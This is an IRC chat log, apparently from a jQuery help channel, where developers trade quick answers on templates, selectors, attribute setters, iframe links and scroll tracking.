[15:47:37] <ccmonster> based on the categories
[16:06:58] <mephux> i need to loop over a json object and combine the key and value into one value.. example {name: value + key}
[16:07:10] <mephux> and return a json object to use with handlebars
[16:07:12] <mephux> any ideas?
[16:07:18] <mephux> i can't seem to figure it out
[16:09:43] <friskd> how can i check to see if a file has been loaded?
[16:10:22] <friskd> i have a templates file that i want to lazy load.
[16:10:32] <friskd> but i only want to do it once.
[16:14:26] <keith_loy> friskd: still here?
[16:14:32] <friskd> yes.
[16:15:08] <keith_loy> friskd: if you are in the context of an object you can set this.function = value instead of the function
[16:15:16] <keith_loy> then after that return the template
[16:15:31] <keith_loy> that way when this.function is called it only has to do the setup once
[16:15:38] <keith_loy> after that it just has the value
[16:15:51] <ben__> Can anyone explain why the foo alert is firing here?  http://jsfiddle.net/rgYQJ/1/
[16:16:40] <friskd> keith_loy: ... sorry im not following that.
[16:16:51] <friskd> basically i have a html file that has jquery template files
[16:16:57] <friskd> if someone hovers over something....
[16:17:04] <friskd> i need to load this template html
[16:17:06] <friskd> into the dom
[16:17:23] <friskd> and then grab the template i needed and return that for a tooltip.
[16:18:13] <ben__> friskd: i do that all the time, what's not working for you?
[16:18:25] <ben__> what kind of templates r u using?
[16:18:50] <friskd> ben__: i'm just figuring it out. I am using jquery tmpl
[16:19:05] <friskd> just need to know how to only make the call once...
[16:19:09] <keith_loy> right so, you need a function expression that will load the tempalte and then assign the templates value to the function expression
[16:19:14] <keith_loy> and return the tempalte for the first time
[16:19:30] <friskd> keith_loy: i need somethign that loads the template html after page load.
[16:19:32] <friskd> via ajax.
[16:19:40] <friskd> i want to load the templates on the fly.
[16:20:16] <ben__> var foo = $('#template');
[16:20:25] <ben__> foo.tmpl({ foo: 'value' });
[16:20:37] <keith_loy> give me a second to illustrate this
[16:20:48] <ben__> unless i'm misunderstanding
[16:21:17] <friskd> ben__: ... ajax load is my confusion.
[16:21:29] <ben__> so the templates are in external files?
[16:21:33] <friskd> yes.
[16:22:04] <ben__> yeah i've had trouble with that too... i'm haven't exactly found a great solution for that yet
[16:22:16] <friskd> i want marketing and other people to be able to edit the content w/out requireing engineering to have to update little text bits...
[16:24:22] <ben__> I haven't tried this, but when you use ajax to populate some element on the page with the contents of an external template file... are you not able to select it anymore?
[16:24:57] <friskd> no. you can.
[16:25:10] <ben__> then doesn't that solve your problem?
[16:26:55] <Kricir> someone please help me? http://pastie.org/1898656 it wont get past the alert("hello")
[16:27:19] <keith_loy> friskd: sorry got distracted with work
[16:27:45] <keith_loy> frisked: have a variable valled "template" with a value of false
[16:27:47] <friskd> no worries.
[16:27:48] <keith_loy> check that value
[16:28:00] <keith_loy> if the value is false, make the ajax request
[16:28:05] <keith_loy> store the template to the variable
[16:28:34] <keith_loy> that's the simplest way i know of
[16:28:41] <friskd> keith_loy: o. gotcha
[16:28:47] <friskd> ok. let me think about that.
[16:28:50] <friskd> thank you.
[16:29:06] <keith_loy> i was trying to explain a better way before, but it's more advanced and would take me a few min to type up
[16:29:50] <keith_loy> if you have a function expression you can just modify the value of the function expression on the first execution of the function
[16:29:54] <keith_loy> and get the same thing
[16:32:27] <bjhaid> i have seen some nice jquery plugins that i want to port into my rails app, I am really new to jquery, can anyone help me out on this?
[16:34:17] <keith_loy> Kricir:  you never call your function
[16:34:51] <keith_loy> Kricir: also, you do not need /* <![CDATA[ */ or /* ]]> */ for browsers made within the last 10 years
[16:35:02] <Kricir> the cms auto adds that
[16:35:27] <Kricir> the function calls in the html and the function is up in the head
[16:35:45] <keith_loy> ok i see the function is getting called in the td
[16:35:56] <Kricir> it gives me the alert "hello" but then gets stuck
[16:36:35] <Kricir> what I'm trying to make is a score table that adds the scores at the end www.westernwisconsintruckpullers.com
[16:36:44] <keith_loy> console.log((section).toArray();)
[16:36:45] <Kricir> www.westernwisconsintruckpullers.com/standings
[16:37:00] <keith_loy> without the ; have toArray()
[16:37:40] <keith_loy> so you want total points?
[16:37:54] <Kricir> right so it will add all the points in the end
[16:38:09] <Kricir> but i want it to be a function so I can call it for each driver
[16:38:13] <z1000> is it possible to control the target of a link in an iframe... from the parent page only?
[16:38:33] <keith_loy> Uncaught ReferenceError: success is not defined
[16:38:38] <keith_loy> that is why it is stopping
[16:38:52] <keith_loy> coming from your alert(success);
[16:39:05] <keith_loy> i'm assuming you meant alert('success')
[16:39:29] <Kricir> i did
[16:39:30] <z1000> anyone?
[16:39:41] <ionico> hello
[16:39:43] <ionico> hi
[16:39:49] <Kricir> so somewhere its not sending the end math back to html any ideas on that
[16:39:58] <keith_loy> z1000, possible yes, sorry but a very long explination and not enough time
[16:40:09] <z1000> ok well how about an easy way to do it?
[16:40:13] <z1000> or good reference link
[16:40:21] <ravenzz> google?
[16:40:29] <z1000> tried
[16:40:30] <z1000> doesnt work
[16:40:32] <keith_loy> i don;t have one off top of my head, I had to do this 2 months ago for work though
[16:40:33] <z1000> http://weblogs.asp.net/soever/archive/2004/07/16/185598.aspx
[16:40:49] <ionico> please tell me if it is posible couse i cant find the answer ,  is it posible to sum the numbers on form filed that were generated dynamicly ?
[16:41:11] <Kricir> ok i feel like i have to be close, I just don't know where Im off
[16:41:18] <ravenzz> z1000 are you trying to manipulate the content of the iframe?
[16:41:27] <z1000> no... then it would be easy
[16:41:28] <keith_loy> ionico: yes, grab the .val(), convert to number, and add them
[16:41:38] <z1000> cannot control from iframe... and I want any link in the iframe to open in new window
[16:42:34] <z1000> I need a way to control iframe link properties from outside the iframe...
[16:42:51] <mustefaj> can i use firebug to generate selectors?
[16:43:12] <mustefaj> like can i input into console and watch it match up or not?
[16:43:36] <keith_loy> not sure, i think so
[16:43:43] <keith_loy> i do this in chrome's console
[16:43:48] <keith_loy> try it
[16:43:54] <Zerxer> yes
[16:43:57] <ravenzz> z1000 if the iframe is not hosted on the same domain you can't do anything
[16:44:06] <z1000> really?
[16:44:10] <ravenzz> the source, of course.
[16:44:18] <z1000> I'm sure there is a way to add a listener...
[16:44:26] <z1000> and say any link requests go to new window or something ?
[16:44:40] <z1000> I can show the example...http://thinkofficeinteriors.com/contact-us
[16:44:53] <z1000> so if u click directions in the iframe... just want that to open new window... I cant imagine its not possible
[16:45:00] <tktiddle> Hi is there any reason jquery would find a div with id="cmspluginGallery3" when i use $('cmspluginGallery3') but not when i use $('#cmspluginGallery3')
[16:45:04] <ravenzz> there isn't. basically you have to add a listener on the "iframed" page
[16:45:25] <z1000> so it is not possible
[16:45:44] <ccmonster> how do i take an xml structure, and append it's children to the parents in an array
[16:46:02] <ccmonster> im trying to create a multi level menu based on an xml document and having some trouble.
[16:46:12] <greentea> sounds complicate
[16:46:18] <ccmonster> ehh..
[16:46:26] <ccmonster> i can get it part of the way.
[16:46:33] <ccmonster> some fine tuning neded for sure.
[16:46:56] <ravenzz> z1000 "get directions" is not into the iframe content
[16:47:55] <ravenzz> is a link over the iframe that open that map into a new window
[16:48:26] <z1000> correct
[16:48:33] <z1000> but I am talking about "Directions" button in the iframe
[16:50:15] <ravenzz> i think that google places a listener to that link
[16:50:26] <z1000> huh
[16:50:33] <ravenzz> that basically check if top.location != window.location
[16:50:35] <ravenzz> then redirects
[16:50:44] <ravenzz> to that page
[16:50:50] <z1000> so youre saying there is a way to do it?
[16:50:55] <ravenzz> i haven't investigate more
[16:51:02] <z1000> ok np
[16:51:08] <z1000> I feel like there has to be a way
[16:56:07] <friskd> Does offset, always adjust an item from its current location?
[16:56:22] <friskd> i have an tooltip
[16:56:26] <friskd> everytime i howver
[16:56:29] <friskd> *hover
[16:56:33] <friskd> the top/left
[16:56:37] <friskd> keep getting doubled
[16:56:54] <friskd> but im always sending in the same top/left params to offset
[16:57:07] <ravenzz> z1000 i suppose something like this http://jsfiddle.net/DYGmZ/1/ (see it as the content of an iframe)
[16:57:31] <mustefaj> if i have a div with a id "superheroes" and inside it is a ul with a class "marvel" which 5 li's, how can i select the 2nd li?
[16:58:09] <mustefaj> $("#superheroes ul.marvel :nth-child(2))
[16:58:10] <mustefaj> ?
[16:58:25] <z1000> hmm I uploaded... not working.. http://thinkofficeinteriors.com/contact-us :(
[16:58:30] <z1000> u have to click show map now btw
[16:58:50] <chovy> i would like to turn a dom object into an html string and strip all the html...whawt's the best way to do this?
[16:59:13] <ravenzz> z1000 anyway you can play with the google maps API
[16:59:26] <ravenzz> to have more control on maps
[16:59:48] <paul_irish> chovy: example?
[16:59:50] <mustefaj> anybody on my selector question above?
[17:00:07] <z1000> yes just for that one little thing though is unneccessary
[17:00:23] <z1000> thanks for help though... I figure if client wants to contact them that bad... by the time they go for get directions its ok if they taken off site
[17:00:25] <chovy> paul_irish: i can strip the html, i just wonder if there's a way to do something like $("ol").toString();
[17:01:30] <paul_irish> chovy: what woudl the output be
[17:01:34] <z1000> thanks thought ravenzz
[17:01:38] <z1000> though*
[17:01:46] <ravenzz> np
[17:01:55] <z1000> you like what I did though?
[17:02:03] <chovy> paul_irish: var str = $("ol").toString(); //=> '<ol><li>...</li></ol>'
[17:02:31] <ravenzz> it's late night here, i should go to sleep ;)
[17:02:47] <ravenzz> yes the design looks pretty

[17:05:03] <chovy> paul_irish: thanks -- perfect!
[17:05:29] <njbair> How can I append text to an attribute value?
[17:06:55] <dabear> njbair: set its value to it self + "foo"
[17:06:58] <paul_irish> $(elem).text(  $(elem).text() + 'omg' )
[17:07:11] <paul_irish> oops
[17:07:17] <friskd> attr
[17:07:20] <paul_irish> ^
[17:07:34] <njbair> but what if the selector returns a bunch of elements? will that work?
[17:07:57] <paul_irish> nah you gotta loop
[17:08:17] <dabear> $(elem).attr("foo", function(){ return this.foo + "omg"})
[17:08:29] <paul_irish> or even
[17:08:34] <dabear> at least I think that used to work
[17:08:40] <paul_irish> ?attr
[17:08:41] <bot-t> .attr(attributeName): Get the value of an attribute for the first element in the set of matched elements. http://api.jquery.com/attr/
[17:08:43] <njbair> I'll try that
[17:08:46] <paul_irish> wait wait
[17:08:51] * Zerxer waits
[17:08:57] * njbair also waits
[17:09:05] <paul_irish> $(elem).attr("foo", function(i, value){ return value + "omg"})
[17:09:06] <Zerxer> when paul_irish says jump, you ask how high
[17:09:26] <Zerxer> hey that's nifty, learn new things every day
[17:09:29] <njbair> what is the i
[17:09:35] <paul_irish> all setters accept a function but the current value gets passed into the fn
[17:09:38] <dabear> i = index
[17:09:42] <paul_irish> i is just the index number
[17:09:57] <Zerxer> index of the element? since it'd apply to multiple I guess
[17:10:03] <paul_irish> yah
[17:10:23] <dabear> njbair: never seen a for loop? for(var i=0; i < 1; i++){}
[17:11:32] <njbair> dabear: No. I've never seen one of those. You just exploded my brain.
[17:11:50] <dabear>  /endtroll please
[17:12:10] <njbair> paul_irish: works!
[17:13:05] <paul_irish> woo
[17:13:12] <dabear> njbair: paul_irish is god. even when he's wrong, he's right
[17:13:35] <Whirl3d> Good evening Rockstars!
[17:13:39] <njbair> wow
[17:13:39] <paul_irish> hi Whirl3d
[17:14:53] <Whirl3d> Here's a simple question about ".live"   I have a div that contains an article. Inside it are several named "topic" anchors...I would like to be able to tell when the topic anchor has scrolled above the top or below the bottom of the visible window. Any suggestions?
[17:17:55] <Juv1228> is it possible to validate pages that are dynamically created with js/jquery?
[17:17:56] <gnarf> Whirl3d: google around, i know i saw something about a custom selector like :is-in-window
[17:17:59] <Whirl3d> I figured I would live bind the scroll event to the ".currentPage" class. Then have it search itself for ".topic" anchors and trigger a custom event in every anchor. The anchor would get it's position, determine if it is above the "scrollTop" of the page, or below the "scrollTop+pageHeight' to determine whether it is visible or not
[17:18:12] <Juv1228> something similar to the w3schools validator
[17:18:20] <gnarf> ?w3schools
[17:18:21] <bot-t> http://w3fools.com
[17:18:25] <Whirl3d> gnarf, will do. Thanks. I have been googling and haven't tried that avenue. I'll check it out.
[17:18:31] <dabear> w3schools validator
[17:18:31] <dabear> lol
[17:18:44] <dabear> w3 validator* ?
[17:18:44] <gnarf> Juv1228: you surely mean the "W3C Validator"
[17:18:49] <dabear> w3c
[17:18:59] <Juv1228> ya, my bad
[17:19:09] <gnarf> Whirl3d: it might used the word "viewport"
[17:19:11] <gnarf> i dunno
[17:19:21] <dabear> w3schools is a great resource for learning web development!
[17:19:41] <dabear> best of all, it's free, everyone can contribute, and all info is correct
[17:20:00] <psilo2> just like wikipedia
[17:20:04] <gnarf> ./kick dabear "w3schools is a great resource for learning web development!"
[17:20:06] <gnarf> ;)
[17:20:24] <gnarf> damn, i shoulda forgotten the "."
[17:20:25] <dabear> gnarf: you almost did it too
[17:20:44] <gnarf> but then i woulda forgotten the #jquery anyway
[17:20:46] * gnarf waves
[17:20:49] <gnarf> im out for the day
[17:20:57] <gnarf> or at least the next hour or two
[17:29:45] <mustefaj> knock knock?
[17:31:02] <mustefaj> i'm having trouble selected the 2nd li of an unordered list
[17:31:09] <mustefaj> selecting*
[17:32:16] <Whirl3d> bye gnarf, thanks for your help
[17:32:35] <Whirl3d> ?nd@mustefaj
[17:32:36] <bot-t> mustefaj, NEIN DU
[17:32:43] <mustefaj> hey bot-t
[17:32:44] <bot-t> mustefaj, :)
[17:32:46] <Whirl3d> I have no idea what that said.
[17:32:51] <Whirl3d> sorry
[17:33:07] <Whirl3d> I meant to give you the help for the nth selector attribute...
[17:33:10] <Whirl3d> ?nth
[17:33:11] <bot-t> Whirl3d, :nth-child() Selector - Selects all elements that are the nth-child of their parent. http://api.jquery.com/nth-child-selector/
[17:33:20] <mustefaj> its not working out
[17:33:26] <Whirl3d> ?nth@mustefaj
[17:33:27] <bot-t> mustefaj, :nth-child() Selector - Selects all elements that are the nth-child of their parent. http://api.jquery.com/nth-child-selector/
[17:33:36] <mustefaj> if i have a div with a id "superheroes" and inside it is a ul with a class "marvel" which 5 li's, how can i select the 2nd li?
[17:33:52] <mustefaj> $("#superheroes ul.marvel :nth-child(2))
[17:34:17] <Juv1228> http://hs.juvsoft.com:8080/demos/demo-02.htm
[17:34:18] <mustefaj> or i should be able to just do $("ul.marvel :nth-child(2)")
[17:34:26] <Juv1228> what do you guys think of that layout?
[17:34:29] <Whirl3d> $(".marvel li:nth-child(2))
[17:34:42] <mustefaj> hm
[17:34:46] <mustefaj> i'll try that Whirl3d
[17:34:47] <mustefaj> thanks
[17:34:48] <mustefaj> umm
[17:35:00] <mustefaj> Juv1228, you should throw some padding into the table
[17:35:03] <Whirl3d> mustefaj, forgot the end quotes
[17:35:09] <mustefaj> yeah i saw that ;)
[17:35:18] <Whirl3d> mustefaj, sorry. LOL
[17:35:24] <mustefaj> :p np i hope it works
[17:35:38] <Juv1228> mustefaj, which way? v or h
[17:35:53] <mustefaj> see how Cutting Diamonds
[17:36:09] <mustefaj> is stuck to the left of its td
[17:36:23] <mustefaj> instead of having like the same spacing that it has above and below the word
[17:36:38] <Juv1228> ah. duh. right.
[17:36:46] <mustefaj> yeah that'd go a long way
[17:37:18] <mustefaj> and try looking at it half screen
[17:37:29] <mustefaj> so if ur on windows, drag the window to the left so it takes up half the screen
[17:39:25] <Juv1228> hows the padding look now?
[17:40:06] <mustefaj> nope
[17:40:50] <Juv1228> whats wrong with it
[17:40:59] <mustefaj> center everything man
[17:41:15] <Juv1228> lol u crazy
[17:41:29] <Juv1228> that would make it crazy hard to read
[17:44:15] <Whirl3d> Does anybody have any experience with binding "scroll" to a div?
[17:45:38] <Whirl3d> that's what I figured. Drats!
[17:46:51] <mustefaj> Juv1228 you should lookup some online radio apps and see how they list stuff
[17:47:11] <Juv1228> mustefaj, check it now
[17:47:22] <Juv1228> i kinda like them centered, except the title
[17:47:23] <queuetip> i have a dialog with a text box and 2 buttons on it, (save and cancel), how can i make it so that when a user presses enter in the textbox that the save button is clicked? or that the action for the save button is executed?
[17:48:21] <queuetip> Whirl3d: you mean so that a div always scrolls down when there's data appeneded?
[17:48:40] <Juv1228> queuetip, http://stackoverflow.com/questions/29943/how-to-submit-a-form-when-the-return-key-is-pressed
[17:48:47] <queuetip> Juv1228: thanks
[17:49:47] <Juv1228> answer #2 is probably best for you seeing as you are already using js
[17:50:35] <queuetip> Juv1228: thanks, i'll get #2 working in no time, just what i needed :P
[17:54:55] <RobW> jquery 1.6.1 is broken...
[17:55:40] <RobW> nevermind !
[17:57:00] <shaggy_> Is there a way to run jQuery in a php if?
[17:57:04] <shaggy_> Something like; <?php if($x=="foo") { echo "<script> $('#bar').hide(); </script>"; }
[17:58:34] <z1000> wow badass site http://crafton.eu/outsource/
[17:58:52] <z1000> funny tho its coded in tables...
[17:59:00] <z1000> cant tell if this is str8 JS or html5 canvas
[17:59:43] <shaggy_> it is cool except it lagged my computer like crazy when I loaded it
[17:59:59] <z1000> ya but nobody is perfect :P
[18:00:09] <z1000> I dont get how they did it
[18:00:15] <shaggy_> Have you tried the 3D version? Does it actually go 3D??
[18:00:23] <z1000> ya
[18:00:40] <tktiddle> How do i use jQuery tools once ive loaded it? im trying $.overlay but it dosnt seem to have attached there
[18:02:03] <queuetip> z1000: too bad their gift for completing it sucks
[18:02:18] <z1000> pardon me sir
[18:02:29] <z1000> build something better and ill give u a gift worth having
[18:03:19] <queuetip> i mean their gift is nothing more than a web design pdf offer : | don't get me wrong, the actual origami thing looks amazing
[18:03:31] <queuetip> s/looks/is
[18:03:37] <z1000> ya its fine dude
[18:03:43] <z1000> I dont care about the gift I care about htf did they do that
[18:04:05] <queuetip> yeah it's pretty brilliant
[18:17:41] <Juv1228> am i just really stupid, or is it not possible to call a jquery function from a html element's onclick event?
[18:19:53] <paul_irish> the former. :)
[18:20:18] <Juv1228> thought so, what am i doing wrong here?
[18:21:57] <Juv1228> <tr class="jp-playlist-even" onclick="rowClick(0);"></tr>
[18:22:01] <Whirl3d> z1000, I think they are just calculating your distance from the correct + sign and then positioning each element at a radius equal to your distance from the correct+ sign. It shouldn't be that hard to calculate, really
[18:22:27] <Juv1228> the rowClick function is declared at page load in the $(document).ready(function(){};
[18:25:45] <Whirl3d> z1000, and the 3D doesn't really do much. They should have used a 3D rotation element in their radii functions. Then it would appear to come out at you. Instead, it just kinda looks 3D. Still it's really cool, though I didn't read a bit of the site text...not the most effective design--but cool as hell nonetheless
[18:28:26] <Whirl3d> anybody had any experience or know any links that would help me to update the hash to reflect the current div in a scrollable parent div?

[18:50:03] <ch3mical> Are you simply using jqm to style your mobile site, or is there some code you had that goes with it?
[18:50:16] <ch3mical> All I see is HTML and jqm CSS
[18:50:23] <mayeco> yes
[18:50:39] <mayeco> nothing else

[19:22:02] <bot-t> .not(selector): Remove elements from the set of matched elements. http://api.jquery.com/not/
[19:22:04] <gnarf> or see ?not
[19:22:05] <bot-t> .not(selector): Remove elements from the set of matched elements. http://api.jquery.com/not/
[19:22:08] <gnarf> you forgot the "see" :)
[19:22:33] <ch3mical> I thought it worked no matter what I say before it, oops
[19:22:40] <ch3mical> sweb: see ?not
[19:22:40] <bot-t> sweb, .not(selector): Remove elements from the set of matched elements. http://api.jquery.com/not/
[19:22:42] <Steedle> i have an input with an id of #input_1_1 , the value is value="" is there a way with jquery to add a value to the input
[19:22:43] <ch3mical> There :P
[19:23:31] <ch3mical> sweb: $('input...').not("#awesomeInput").attr(...)
[19:23:48] <gnarf> sweb: just fyi, if you are using jQuery 1.6  or above, you should be using .prop("disabled", true)
[19:23:48] <ch3mical> Except don't mix quotes like I just did
[19:23:53] <ch3mical> That's lame
[19:23:58] <gnarf> not .attr("disabled", "disabled")
[19:24:02] <chromakode> any ideas what timing changes may have happened to $.ready between 1.3.1 and 1.6?
[19:24:15] <sweb> ch3mical, gnarf, thank guys. got it
[19:24:15] <gnarf> chromakode: there isn't a function called $.read
[19:24:27] <chromakode> I mean the ready event, gnarf :)
[19:24:36] <gnarf> chromakode: but $.fn.ready() should behave like it always has
[19:24:41] <ch3mical> Does prop handle "checked" properly when setting it to false, I wonder?
[19:24:49] <ch3mical> I know .attr doesn't
[19:24:53] <gnarf> its "changed" a bit since then, but...
[19:24:57] <chromakode> gnarf, I have a really fascinating case I'm dealing with, at reddit.
[19:25:02] <gnarf> ch3mical: yes it does
[19:25:11] <chromakode> gnarf, upgrading from 1.3.1 to 1.6 causes adblock to apparently interact differently with our site.
[19:25:16] <ch3mical> Nice, I'm going to have to start using 1.6 soon
[19:25:17] <chromakode> I'm suspecting it has something to do with timing.
[19:25:40] <ch3mical> chromakode: fascinating
[19:25:48] <chromakode> we pushed 1.6 today
[19:25:53] <chromakode> and rolled back, the same as the past couple days
[19:25:57] <chromakode> because our request rate dropped
[19:26:01] <gnarf> chromakode: 1.6.1 ?
[19:26:03] <psilo2> 1.3.1 is a hell of an upgrade
[19:26:03] <chromakode> suddently, adblock was blocking our ad pixels!
[19:26:05] <chromakode> gnarf, yes
[19:26:09] <chromakode> it is
[19:26:11] <chromakode> a gnarly upgrade
[19:26:15] <chromakode> thankfully everything works
[19:26:21] <chromakode> it took forever to discover that adblock was the cause
[19:26:25] <gnarf> chromakode: review every call to .attr()
[19:26:29] <chromakode> done :)
[19:26:35] <chromakode> that all works.
[19:26:36] <gnarf> chromakode: awesome!
[19:26:37] <gnarf> ?hi5
[19:26:38] <bot-t> ‚Åµ
[19:26:52] <chromakode> we have requests that fire when adblock is enabled for jquery 1.3, and ones that don't for 1.6.1
[19:27:22] <gnarf> chromakode: that sounds interesting to say the least... if you could track the source of that adblockage
[19:27:26] <Whirl3d> Ch3mical, I don't spose youa re still bored are ya? LOL
[19:27:34] <chromakode> agreed, gnarf, I'm working on it
[19:27:38] <ch3mical> Whirl3d: ever get that AJAX working?
[19:28:05] <ch3mical> Whirl3d: you went silent on me the other day, and eventually I had to go
[19:28:21] <Whirl3d> ch3mical, yes, thanks. Come to find out Dreamweaver deletes a file before uploading it. So if you cancel, you lose your content.
[19:28:36] <ch3mical> ("adblockage" lol... sounds gross)
[19:28:49] <ch3mical> Whirl3d: yikes
[19:29:01] <ch3mical> Whirl3d: What you got for me tonight?
[19:29:02] <Whirl3d> Ch3mical, thanks for your help, sorry to disappear, but I found out that a LOT of the stuff I assumed was there was missing.
[19:29:17] <gnarf> chromakode: i would think if there was something in jQuery 1.6 that caused it not to work right with adblock some developer out there would have noticed and bug reported it by now... but who knows, maybe you're that guy
[19:29:26] <ch3mical> Glad you got it figured out lol
[19:29:47] <chromakode> thanks gnarf, it could very well be something oddly specific with our codebase
[19:29:52] <gnarf> Whirl3d: dreamweaver? ewwww
[19:30:00] <chromakode> I thought I'd ping the experts about any possible leads before tearing my hair out :)
[19:30:08] <Whirl3d> Ch3mical, this is a fun one. I have a scrolling div that contains several anchors with "title" and "name" attributes. I want to update the top and bottom of the scrolling window with the title of the nearest anchor element
[19:30:08] <ch3mical> gnarf: to each his own?
[19:30:19] <gnarf> chromakode: you are slowly becoming the jQuery 1.6.1 adblock expert
[19:30:20] <Whirl3d> gnarf, I agree.
[19:30:26] <gnarf> ?glwt @chromakode ;)
[19:30:27] <bot-t> gnarf, Couldn't find "glwt @chromakode ;)" in jQuery Docs.
[19:30:30] <gnarf> ?glwt @chromakode
[19:30:30] <bot-t> chromakode, Good Luck With That
[19:30:31] <gnarf> ;)
[19:30:42] <chromakode> ty
[19:30:52] <ch3mical> oh bots.
[19:31:06] <gnarf> wat about bots?
[19:31:15] <ch3mical> Silly critters
[19:31:35] <ch3mical> Whirl3d: having a hard time visualizing that
[19:32:09] <ch3mical> You have a text over the top and bottom that tells you the name of the "next" or "prev" anchor?
[19:32:15] <Whirl3d> Ch3mical, so the idea is like this. As you read a "topic" and you get 3/4 of the way down the page, if you wan to go to the top of the "topic" you click a button at the top of the page
[19:32:29] <ch3mical> ok
[19:32:41] <Whirl3d> Ch3mical the same is true for the bottom of the page, if you want to go to the next topic, you click a link at the bottom of the page
[19:32:59] <Whirl3d> Ch3mical, (it would of course update the hash and the navmenu accordingly)
[19:33:19] <ch3mical> go on...
[19:33:43] <gnarf> Whirl3d: have you ever seen sausage?
[19:33:44] <Whirl3d> Ch3mical, I thought it would be easy to subtract the scrollTop from each topic's position().top and if<0  and >the current topic update the top topic
[19:33:50] <ch3mical> So the page is actually a segment of a "topic"?
[19:34:08] <ch3mical> And you have anchors to other parts of the topic
[19:34:19] <Whirl3d> the page contains several topics (each topic represented by an anchor
[19:34:28] <gnarf> http://blogfreakz.com/jquery/sausage-jquery-ui-widget-for-contextual-pagination/ - demo: http://christophercliff.github.com/sausage/examples/basic.html (look on the right)
[19:34:32] <Whirl3d> one page, 10 topics.
[19:34:39] <gnarf> Whirl3d: it has to have some code for that
[19:34:45] <Whirl3d> gnarf, I'll check it out.
[19:34:55] <gnarf> Whirl3d: cuz it updates the sausages
[19:35:43] <ch3mical> Whirl3d: maybe a visual aid would help me :)
[19:36:09] <gnarf> it was a yayquery plugin of the week one week
[19:36:09] <Whirl3d> ch3mical, coming up
[19:36:15] <gnarf> cuz ajpiano thought it was really really great
[19:36:44] * gnarf does the plugin of the week song in his head and misses yayquery
[19:38:03] <ch3mical> gnarf: I don't see the value in that
[19:38:37] <gnarf> ch3mical: sausage?
[19:38:46] <ch3mical> Yeah
[19:38:57] <ch3mical> It's clever, but I don't see it being useful
[19:39:33] <gnarf> i think it was more about looking at http://christophercliff.github.com/sausage/jquery.sausage.js and seeing an example of a widget factory thing
[19:41:40] <ch3mical> gnarf: cool
[19:42:19] <ch3mical> Hopefully someday I'll be that awesome with js/jquery :P
[19:42:49] <geekbuntu_> gnarf, it's using yui as the base for the jquery plugin of the week? o.0
[19:44:11] <gnarf> yui?
[19:44:33] <gnarf> don't quote me on the "potw" thing, i just think thats what it was, it was definately on yayquery tho talking bout widget factory
[19:45:21] <geekbuntu> gnarf - it looks yui is the css (not sure why), but i got a little excited when i saw yui - watching some lectures now by the founder of yui
[19:45:27] <geekbuntu> (seemed odd to me)
[19:45:37] <gnarf> geekbuntu: lots of people use the yui css reset
[19:45:39] <ch3mical> meh @ yui
[19:45:41] <gnarf> its handy
[19:45:46] <geekbuntu> gnarf, not me (yet)
[19:45:59] <geekbuntu> gnarf, my 'todo list' is a mile long
[19:46:09] <gnarf> geekbuntu: do you use any css reset?
[19:46:59] <geekbuntu> i started using a html5 boiler plate... i dont' think anyone knows for certain where the new html standard will end up... so i found a boilerplate i'm using... was suggested i use blueprint or someething too
[19:47:09] <Whirl3d> sorry about that. Here is the url of the page, click on Experience once it loads to see what I am talking about
[19:47:10] <geekbuntu> gnarf, ^^
[19:47:10] <Whirl3d> http://www.ldwolfe.net/ourfirm/sectionTest-6.html
[19:47:40] <ch3mical> weee
[19:47:49] <geekbuntu> page shows nice
[19:48:05] <ch3mical> Lots of overflow weirdness happening
[19:48:11] <geekbuntu> yep
[19:48:16] <geekbuntu> im using chrome on this pc
[19:48:23] <geekbuntu> like a 50px overlap
[19:48:39] <ch3mical> Ok, I think I get you now
[19:49:02] <ch3mical> Chrome OS here
[19:49:06] <m1chael> im working on this script... http://media.lmwblog.com/test.html # does anyone know how i can create a more elegent drop down box? that won't disappear without more of a fight
[19:49:23] <ch3mical> m1chael: jquery ui
[19:49:25] <geekbuntu> man ie9 will 'not' load the site
[19:49:28] <Whirl3d> ch3mical, see where it says featured cases at the top and bottom, it should update both of those so you click and it takes you to the content. Clicking on Prev or Next would of course take you to the previous "topic"
[19:49:45] <gnarf> ch3mical: i don't think selectmenu is part of ui (yet)
[19:49:49] <gnarf> ?selectmenu
[19:49:50] <bot-t> gnarf, select menu | jQuery Plugins - uiSelect allows you to easily style all elements of form select menus. http://plugins.jquery.com/plugin-tags/select-menu
[19:49:54] <gnarf> not that one
[19:49:55] <gnarf> grr
[19:50:06] <ch3mical> gnarf: I thought
[19:50:18] <ch3mical> There's something like it on autocomplete anyway
[19:50:22] <gnarf> http://www.filamentgroup.com/lab/jquery_ui_selectmenu_an_aria_accessible_plugin_for_styling_a_html_select/
[19:50:41] <Whirl3d> ch3mical, I have the sidemenu update with the updated "topic" items, but I can't figure out how to determine the "current" scrolled to topic
[19:50:46] <ch3mical> Guess that's not the same
[19:50:50] <geekbuntu> the autocomplete is very slow...
[19:50:55] <geekbuntu> scratch that - it's dead
[19:51:01] <ch3mical> Whirl3d: checking
[19:51:10] <ch3mical> geekbuntu: hasn't been slow for me
[19:51:16] <geekbuntu> i typed boston
[19:51:20] <geekbuntu> nota
[19:51:40] <geekbuntu> typing other city names
[19:51:47] <geekbuntu> (dallas/atlanta)
[19:51:49] <geekbuntu> nuttin
[19:52:12] <gnarf> ch3mical: ahh i was confuzzled
[19:52:16] <gnarf> ?autocomplete
[19:52:17] <bot-t> jQuery UI - Autocomplete Demos & Documentation - The Autocomplete widgets provides suggestions while you type into the field. Here the suggestions are tags for programming languages, give "ja" (for Java or JavaScript) a try. http://jqueryui.com/demos/autocomplete/
[19:52:29] <gnarf> i never clicked on his link
[19:52:39] <gnarf> didn't see that it was autocompletey
[19:52:53] <gnarf> his description sounded much more selectmenuy
[19:53:09] <geekbuntu> whoever posted the link to the filamentogroup.com select menu - thanks
[19:53:10] <geekbuntu> nice
[19:53:29] <gnarf> geekbuntu: yeah, its sexy
[19:53:41] <ch3mical> Whirl3d: I think you might have to just hardcode scroll points in and change them based on that...
[19:53:50] <geekbuntu> gnarf, i'm homophoebic i'll stick with 'sharp'
[19:53:52] <geekbuntu> :-D
[19:54:02] <ch3mical> Whirl3d: I don't think you can easily map the scroll value to the y-pos of the element
[19:54:15] <ch3mical> Not without some maths
[19:54:17] <gnarf> geekbuntu: f that... its sexy #js
[19:54:24] <geekbuntu> gnarf, lol
[19:54:25] <geekbuntu> kk
[19:54:37] <gnarf> ch3mical: um, scrollTop() vs offset() ?
[19:54:54] <gnarf> or position()
[19:54:58] <ch3mical> gnarf: I'm saying I don't think it will match up right
[19:55:00] <gnarf> kinda depends on the situation
[19:55:01] <geekbuntu> whos link is this? http://www.ldwolfe.net/ourfirm/sectionTest-6.html
[19:55:07] <ch3mical> In this situation
